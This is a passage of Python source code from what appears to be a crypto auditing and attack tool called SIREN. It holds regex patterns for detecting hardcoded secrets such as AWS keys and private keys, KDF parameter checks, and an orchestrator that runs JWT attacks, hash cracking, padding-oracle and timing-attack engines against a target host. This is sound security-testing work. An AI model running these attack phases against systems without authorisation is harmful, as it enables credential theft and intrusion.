            (r'["\']([0-9a-fA-F]{32,128})["\']', "hex key"),
            # Base64 keys
            (r'["\']([A-Za-z0-9+/]{32,}={0,2})["\']', "base64 key"),
            # PEM private keys
            (r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----", "PEM private key"),
            # AWS keys
            (r"(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}", "AWS access key"),
            # API keys / secrets in assignments
            (
                r'(?:api[_-]?key|secret[_-]?key|auth[_-]?token|private[_-]?key)\s*[=:]\s*["\']([^"\']{16,})["\']',
                "API/secret key",
            ),
            # JWT secrets
            (
                r'(?:jwt[_-]?secret|token[_-]?secret|signing[_-]?key)\s*[=:]\s*["\']([^"\']+)["\']',
                "JWT secret",
            ),
            # Connection strings with passwords
            (
                r'(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\']+)["\']',
                "hardcoded password",
            ),
        ]

        for pattern, key_type in patterns:
            for match in re.finditer(pattern, source_code, re.IGNORECASE):
                context_start = max(0, match.start() - 50)
                context_end = min(len(source_code), match.end() + 50)
                context = source_code[context_start:context_end]

                # Skip obvious non-keys (test files, examples, documentation)
                skip_indicators = [
                    "example",
                    "placeholder",
                    "changeme",
                    "xxx",
                    "test",
                    "TODO",
                ]
                if any(ind in context.lower() for ind in skip_indicators):
                    continue

                finding = CryptoFinding(
                    attack_type=CryptoAttackType.KEY_REUSE,
                    severity=(
                        CryptoSeverity.HIGH
                        if "private" in key_type.lower() or "aws" in key_type.lower()
                        else CryptoSeverity.MEDIUM
                    ),
                    title=f"Hardcoded {key_type.title()} Detected",
                    description=(
                        f"Found hardcoded {key_type} in source code. "
                        "Secrets should never be stored in source code."
                    ),
                    evidence=f"Type: {key_type}\nContext: ...{context}...",
                    impact="Key extraction from source code. Credential exposure in version control.",
                    remediation=(
                        "1. Use environment variables for secrets\n"
                        "2. Use a secrets manager (HashiCorp Vault, AWS Secrets Manager)\n"
                        "3. Use .env files excluded from version control\n"
                        "4. Rotate the exposed keys immediately"
                    ),
                    cvss_score=7.5,
                    cwe_id="CWE-798",
                )
                findings.append(finding)

        self.findings.extend(findings)
        return findings

    def analyze_kdf_params(
        self,
        algorithm: str,
        iterations: int = 0,
        memory_cost: int = 0,
        parallelism: int = 0,
        salt_length: int = 0,
    ) -> Optional[CryptoFinding]:
        """Analyze key derivation function parameters."""
        issues = []

        if algorithm.lower() in ("pbkdf2", "pbkdf2_sha256", "pbkdf2_sha512"):
            if iterations < 100_000:
                issues.append(f"PBKDF2 iterations too low: {iterations} (min: 100,000)")
            if iterations < 600_000:
                issues.append(
                    f"PBKDF2 iterations below OWASP 2023 recommendation: {iterations} (rec: 600,000)"
                )

        elif algorithm.lower() == "bcrypt":
            # Work factor is log2(iterations)
            if iterations < 10:
                issues.append(f"bcrypt work factor too low: {iterations} (min: 10)")
            if iterations < 12:
                issues.append(
                    f"bcrypt work factor below recommendation: {iterations} (rec: 12)"
                )

        elif algorithm.lower() in ("argon2", "argon2id", "argon2i", "argon2d"):
            if memory_cost < 19_456:  # 19 MiB
                issues.append(
                    f"Argon2 memory cost too low: {memory_cost} KiB (min: 19,456)"
                )
            if iterations < 2:
                issues.append(f"Argon2 time cost too low: {iterations} (min: 2)")
            if parallelism < 1:
                issues.append(f"Argon2 parallelism too low: {parallelism} (min: 1)")

        elif algorithm.lower() == "scrypt":
            if iterations < 32768:  # N parameter
                issues.append(f"scrypt N parameter too low: {iterations} (min: 32768)")
            if memory_cost < 8:  # r parameter
                issues.append(f"scrypt r parameter too low: {memory_cost} (min: 8)")

        if salt_length > 0 and salt_length < 16:
            issues.append(f"Salt too short: {salt_length} bytes (min: 16)")

        if issues:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.WEAK_KEY_SIZE,
                severity=(
                    CryptoSeverity.HIGH if len(issues) >= 2 else CryptoSeverity.MEDIUM
                ),
                title=f"Weak KDF Parameters: {algorithm}",
                description=f"Key derivation parameters are insufficient: {'; '.join(issues)}",
                evidence="\n".join(issues),
                impact="Faster password cracking. Reduced brute-force resistance.",
                remediation=(
                    "Use OWASP recommended parameters:\n"
                    "  - Argon2id: m=19456, t=2, p=1 (minimum)\n"
                    "  - bcrypt: work factor 12+\n"
                    "  - PBKDF2-SHA256: 600,000+ iterations\n"
                    "  - scrypt: N=32768, r=8, p=1"
                ),
                cvss_score=6.5,
                cwe_id="CWE-916",
            )
            self.findings.append(finding)
            return finding
        return None


# =========================================================================
#  MAIN CRYPTO ENGINE — ORCHESTRATOR
# =========================================================================


class SirenCryptoEngine:
    """
    Main cryptographic analysis and attack orchestrator.

    Coordinates all sub-engines:
    - JWTAttackEngine
    - HashEngine
    - CipherAnalyzer
    - TLSScanner
    - PaddingOracleEngine
    - ECBDetector
    - CBCBitFlipEngine
    - TimingAttackEngine
    - RandomnessAnalyzer
    - KeyStrengthAnalyzer

    Provides unified interface for crypto auditing.
    """

    def __init__(self, config: Optional[CryptoConfig] = None):
        self.config = config or CryptoConfig()
        self.jwt_engine = JWTAttackEngine(self.config)
        self.hash_engine = HashEngine(self.config)
        self.cipher_analyzer = CipherAnalyzer()
        self.tls_scanner = TLSScanner(self.config)
        self.padding_oracle = PaddingOracleEngine(self.config)
        self.ecb_detector = ECBDetector()
        self.cbc_flipper = CBCBitFlipEngine()
        self.timing_engine = TimingAttackEngine(self.config)
        self.randomness_analyzer = RandomnessAnalyzer()
        self.key_analyzer = KeyStrengthAnalyzer()
        self._all_findings: List[CryptoFinding] = []
        self._scan_start: float = 0
        self._scan_end: float = 0

    async def full_crypto_audit(
        self,
        target: str,
        jwt_tokens: Optional[List[str]] = None,
        hashes: Optional[List[str]] = None,
        ciphertext_samples: Optional[List[bytes]] = None,
        source_code: Optional[str] = None,
        tokens: Optional[List[str]] = None,
        public_key: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Run a comprehensive cryptographic audit.

        Args:
            target: Target hostname or URL
            jwt_tokens: JWT tokens to analyze
            hashes: Hash values to crack
            ciphertext_samples: Encrypted data samples to analyze
            source_code: Source code to scan for hardcoded keys
            tokens: Session tokens/IDs to test randomness
            public_key: Public key for algorithm confusion attacks

        Returns:
            Complete audit report with all findings
        """
        self._scan_start = time.time()
        report: Dict[str, Any] = {
            "target": target,
            "scan_time": None,
            "summary": {},
            "jwt_findings": [],
            "hash_findings": [],
            "tls_findings": [],
            "cipher_findings": [],
            "encryption_findings": [],
            "code_findings": [],
            "randomness_findings": [],
            "all_findings": [],
        }

        # Phase 1: JWT Analysis
        if jwt_tokens:
            logger.info("Phase 1: Analyzing %d JWT tokens...", len(jwt_tokens))
            for token_str in jwt_tokens:
                findings = await self.jwt_engine.full_attack(token_str, public_key)
                report["jwt_findings"].extend([f.to_dict() for f in findings])

        # Phase 2: Hash Cracking
        if hashes:
            logger.info("Phase 2: Attempting to crack %d hashes...", len(hashes))
            results = await self.hash_engine.analyze_and_crack(hashes)
            report["hash_findings"] = [r.__dict__ for r in results]

        # Phase 3: TLS/SSL Scan
        host = self._extract_host(target)
        if host:
            logger.info("Phase 3: Scanning TLS configuration for %s...", host)
            try:
                tls_info = await self.tls_scanner.scan_host(host)
                report["tls_findings"] = {
                    "supported_versions": tls_info.supported_versions,
                    "cipher_suites": [c.__dict__ for c in tls_info.cipher_suites],
                    "certificate": (
                        tls_info.certificate.__dict__ if tls_info.certificate else None
                    ),
                    "vulnerabilities": tls_info.vulnerabilities,
                }
            except Exception as exc:
                logger.warning("TLS scan failed: %s", exc)
                report["tls_findings"] = {"error": str(exc)}

        # Phase 4: Ciphertext Analysis
        if ciphertext_samples:
            logger.info(
                "Phase 4: Analyzing %d ciphertext samples...", len(ciphertext_samples)
            )
            for sample in ciphertext_samples:
                # ECB detection
                ecb_finding = self.ecb_detector.detect_ecb_repetitions(sample)
                if ecb_finding:
                    report["encryption_findings"].append(ecb_finding.to_dict())

                # Entropy analysis
                entropy = self.ecb_detector.analyze_entropy(sample)
                report["encryption_findings"].append(
                    {"type": "entropy_analysis", **entropy}
                )

        # Phase 5: Source Code Analysis
        if source_code:
            logger.info("Phase 5: Scanning source code for hardcoded keys...")
            key_findings = self.key_analyzer.detect_hardcoded_keys(source_code)
            report["code_findings"] = [f.to_dict() for f in key_findings]

        # Phase 6: Randomness Analysis
        if tokens:
            logger.info("Phase 6: Analyzing %d tokens for randomness...", len(tokens))
            rand_finding = self.randomness_analyzer.analyze_tokens(tokens)
            if rand_finding:
                report["randomness_findings"] = [rand_finding.to_dict()]

        # Aggregate all findings
        all_findings = []
        for engine in [
            self.jwt_engine,
            self.hash_engine,
            self.tls_scanner,
            self.cipher_analyzer,
            self.ecb_detector,
            self.cbc_flipper,
            self.timing_engine,
            self.randomness_analyzer,
            self.key_analyzer,
            self.padding_oracle,
        ]:
            all_findings.extend(engine.findings)

        self._all_findings = all_findings
        self._scan_end = time.time()

        report["all_findings"] = [f.to_dict() for f in all_findings]
        report["scan_time"] = self._scan_end - self._scan_start
        report["summary"] = self._generate_summary(all_findings)

        return report

    def _generate_summary(self, findings: List[CryptoFinding]) -> Dict[str, Any]:
        """Generate a summary of all findings."""
        severity_counts = defaultdict(int)
        attack_type_counts = defaultdict(int)

        for f in findings:
            severity_counts[f.severity.value] += 1
            attack_type_counts[f.attack_type.name] += 1

        max_cvss = max((f.cvss_score for f in findings), default=0)

        return {
            "total_findings": len(findings),
            "by_severity": dict(severity_counts),
            "by_attack_type": dict(attack_type_counts),
            "max_cvss": max_cvss,
            "risk_level": (
                "CRITICAL"
                if severity_counts.get("critical", 0) > 0
                else (
                    "HIGH"
                    if severity_counts.get("high", 0) > 0
                    else (
                        "MEDIUM"
                        if severity_counts.get("medium", 0) > 0
                        else "LOW" if severity_counts.get("low", 0) > 0 else "INFO"
                    )
                )
            ),
            "scan_duration_ms": (self._scan_end - self._scan_start) * 1000,
        }

    @staticmethod
    def _extract_host(target: str) -> Optional[str]:
        """Extract hostname from URL or address."""
        if "://" in target:
            parsed = urllib.parse.urlparse(target)
            return parsed.hostname
        if ":" in target:
            return target.split(":")[0]
        return target if "." in target else None

    def generate_report(self) -> str:
        """Generate a Markdown report of all findings."""
        lines = [
            "# SIREN Cryptographic Audit Report",
            "",
            f"**Scan Duration:** {(self._scan_end - self._scan_start):.2f}s",
            f"**Total Findings:** {len(self._all_findings)}",
            "",
        ]

        # Summary table
        severity_order = ["critical", "high", "medium", "low", "info"]
        severity_icons = {
            "critical": "🔴",
            "high": "🟠",
            "medium": "🟡",
            "low": "🟢",
            "info": "🔵",
        }
        counts = defaultdict(int)
        for f in self._all_findings:
            counts[f.severity.value] += 1

        lines.append("## Summary")
        lines.append("")
        lines.append("| Severity | Count |")
        lines.append("|----------|-------|")
        for sev in severity_order:
            if counts.get(sev, 0) > 0:
                lines.append(
                    f"| {severity_icons.get(sev, '')} {sev.upper()} | {counts[sev]} |"
                )
        lines.append("")

        # Detailed findings
        lines.append("## Findings")
        lines.append("")

        for i, finding in enumerate(self._all_findings, 1):
            lines.append(f"### {i}. [{finding.severity.value.upper()}] {finding.title}")
            lines.append("")
            lines.append(f"**Type:** {finding.attack_type.name}")
            lines.append(f"**CVSS:** {finding.cvss_score}")
            if finding.cwe_id:
                lines.append(f"**CWE:** {finding.cwe_id}")
            lines.append("")
            lines.append(f"**Description:** {finding.description}")
            lines.append("")
            if finding.evidence:
                lines.append("**Evidence:**")
                lines.append(f"```\n{finding.evidence}\n```")
                lines.append("")
            if finding.impact:
                lines.append(f"**Impact:** {finding.impact}")
                lines.append("")
            if finding.remediation:
                lines.append(f"**Remediation:** {finding.remediation}")
                lines.append("")
            lines.append("---")
            lines.append("")

        return "\n".join(lines)

    @property
    def findings(self) -> List[CryptoFinding]:
        return list(self._all_findings)

    @property
    def stats(self) -> Dict[str, Any]:
        return {
            "jwt_stats": self.jwt_engine.stats,
            "hash_stats": self.hash_engine.stats,
            "total_findings": len(self._all_findings),
            "scan_duration_s": self._scan_end - self._scan_start,
        }
